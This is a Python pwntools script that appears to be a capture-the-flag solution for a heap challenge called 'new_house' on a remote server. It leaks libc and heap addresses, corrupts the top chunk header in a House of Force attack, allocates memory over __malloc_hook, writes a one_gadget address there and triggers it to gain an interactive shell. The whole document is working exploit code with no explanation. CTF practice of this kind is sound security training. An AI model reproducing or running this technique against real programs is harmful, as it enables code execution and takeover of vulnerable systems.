#!/usr/bin/env python3

from pwn import *

exe = ELF("./new_house")
libc = ELF("./libc.so.6")
context.binary = exe

# p = process("./new_house")
# gdb.attach(p)
p = remote("flu.xxx", 10170)

p.recvuntil(b"interesting in the ground: ")
libc.address = int(p.recvline().decode().strip(),16)
one_gadget_empty_rsp30 = libc.address + 0x40e8a # if malloc_hook overwrite
malloc_hook = libc.address + 0x3aabf0

log.success(f"{hex(libc.address)=}")
log.success(f"{hex(one_gadget_empty_rsp30)=}")
log.success(f"{hex(malloc_hook)=}")

def create_room(name, size):
    p.recvuntil(b">>> ")
    p.sendline(b"1")
    p.recvuntil(b"roomname? ")
    p.sendline(name.encode())
    p.recvuntil(b"roomsize? ")
    p.sendline(str(size).encode())

def edit_room(number, payload):
    p.recvuntil(b">>> ")
    p.sendline(b"3")
    p.recvuntil(b"roomnumber? ")
    p.sendline(str(number).encode())
    p.recvuntil(b"What goes into the room? ")
    p.sendline(payload)

create_room("A"*16, 0x100)

p.recvuntil(b">>> ") # leak heap
p.sendline(b"4")
p.recvuntil(b"A"*16)
heap_leak = u64(p.recvline()[:4].ljust(8,b"\x00"))
log.success(f"{hex(heap_leak)=}")

p.recvuntil(b">>> ") # free first chunk
p.sendline(b"2")
p.recvuntil(b"roomnumber? ")
p.sendline(b"0")

create_room("B"*4, 0x10)
edit_room(0, b"B"*24 + b"\xff"*8) # overwrite top chunk header

distance = malloc_hook - heap_leak - 0x30

create_room("C"*4, distance)
create_room("D"*4, 0x10) # returns pointer to malloc hook
edit_room(3, p64(one_gadget_empty_rsp30)) # overwrite malloc hook with onegadget
create_room("E"*4, 0x10)

p.interactive()
